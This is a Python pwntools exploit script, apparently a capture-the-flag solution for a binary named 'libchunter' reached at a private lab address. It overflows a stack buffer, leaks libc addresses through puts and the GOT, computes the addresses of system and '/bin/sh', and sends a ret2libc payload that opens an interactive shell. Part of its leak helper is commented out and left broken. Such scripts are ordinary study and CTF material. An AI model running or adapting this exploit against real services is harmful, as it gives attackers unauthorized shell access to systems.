# -*- coding: utf-8 -*-

from pwn import *

pwnable_filename = "./libchunter"

Io = remote("192.168.210.11", 10009)
# Io = process(pwnable_filename)

# gdb.attach(proc.pidof(Io)[0], gdbscript='b system\nc')

pwnable = ELF(pwnable_filename)


puts_plt = pwnable.plt['puts']
gets_plt = pwnable.plt['gets']

bss_addr = pwnable.bss(4)
main_addr = 0x080484E7

puts_got = pwnable.got['puts']

junk_size = 0x2C
junk = "A" * junk_size

# Clear buffer
Io.read()


def leak_all(address):
    # Leak puts got
    payload = flat([
        junk,
        p32(puts_plt),
        p32(main_addr),
        p32(address),
    ])
    Io.sendline(payload)
    data = Io.read()
    print "[+] 0x%08x => %r" % (address, data)
    avaliable_data = data.split("\nFind your own libc :)")[0]
    return avaliable_data


# def leak(address):
    # result = ""
    # avaliable_data = leak_all(address)
    # if len(avaliable_data) == 0:
    #     result = avaliable_data + "\x00" + leak_all(address + 1)
    # elif len(avaliable_data) == 1:
    #     result = avaliable_data + "\x00" + leak_all(address + 2)
    # elif len(avaliable_data) == 2:
    #     result = avaliable_data + "\x00" + leak_all(address + 3)
    # elif len(avaliable_data) == 3:
    #     result = avaliable_data + "\x00"
    # else:
    #     result = avaliable_data[0:4]
    # return result[0:4]


    if "\n" in p32(address):
        return "AAAA"
    # Leak puts got
    payload = flat([
        junk,
        p32(puts_plt),
        p32(main_addr),
        p32(address),
    ])
    Io.sendline(payload)
    data = Io.read()
    print "[+] 0x%08x => %s" % (address, data.encode("hex"))
    avaliable_data = data.split("\nFind your own libc :)")[0]
    if len(avaliable_data) < 4 :
        avaliable_data += "\x00"
        avaliable_data += leak(address + len(avaliable_data))
    return avaliable_data[0:4]

# puts_addr = leak(0x0804A018)
# print "[+] puts_addr: 0x%08x" % (u32(puts_addr))

# gets_addr = leak(0x0804A00C)
# print "[+] gets_addr: 0x%08x" % (u32(gets_addr))


# puts_addr = leak(pwnable.got['puts'])
# print "[+] puts_addr: 0x%08x" % (u32(puts_addr))
address = 0x0804A00C
payload = flat([
    junk,
    p32(puts_plt),
    p32(main_addr),
    p32(address),
])
Io.sendline(payload)
data = Io.read()
setbuf_addr = data[0:4]
gets_addr = data[4:8]
print "[+] setbuf_addr: 0x%08x" % (u32(setbuf_addr))
print "[+] gets_addr: 0x%08x" % (u32(gets_addr))



# d = DynELF(leak, elf=pwnable)
# system_addr = d.lookup('system', 'libc')
# print "[+] system_addr: 0x%08x" % (system_addr)

# # gets(bss_addr)
# payload = flat([
#     junk,
#     p32(gets_plt),
#     p32(main_addr),
#     p32(0x0804A020),
# ])

# # gdb.attach(proc.pidof(Io)[0], gdbscript='')
# # Io.interactive()

# Io.sendline(payload)
# Io.sendline("/bin/sh")

gets_offset = 0x066ae0
system_offset = 0x03cd10
bin_sh_offset = 0x17b8cf

system_addr = u32(gets_addr) - gets_offset + system_offset
print "[+] system_addr: 0x%08x" % (system_addr)
bin_sh_addr = u32(gets_addr) - gets_offset + bin_sh_offset
print "[+] bin_sh_addr: 0x%08x" % (bin_sh_addr)


# # Leak gets got
payload = flat([
    junk,
    p32(system_addr),
    p32(0),
    p32(bin_sh_addr),
])
Io.sendline(payload)

Io.interactive()
